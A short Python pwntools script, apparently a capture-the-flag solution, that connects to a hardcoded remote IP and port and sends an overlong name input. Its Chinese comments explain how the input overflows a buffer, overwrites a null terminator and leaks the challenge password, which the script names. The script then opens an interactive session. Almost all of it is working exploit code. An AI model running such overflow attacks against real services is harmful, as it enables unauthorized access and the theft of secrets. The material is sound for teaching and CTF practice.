#!/usr/bin/python

from pwn import *

context.arch = "amd64"
r = remote("124.16.75.117", 51001)
r.sendline(b"a" * 0x41)
# 长输入直接爆出了NeSE123456（后验证为此题密码）
# 有点蒙
# r.sendline(b"a" * 0x4)
# r.sendlineafter(b"Password >", b"NeSE123456")

r.interactive()
# AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# 最长保留63长度姓名输入
# name与,\npassword >使用了同一个字符串
# 读入了63长度的A
# password在读入的时候，覆盖掉了name+(password提示)的后面部分
# 也就是A读入导致了缓冲区溢出到了原本应该写Password的地方
# 于是在输出name字符串时，\0被覆盖，Password泄露
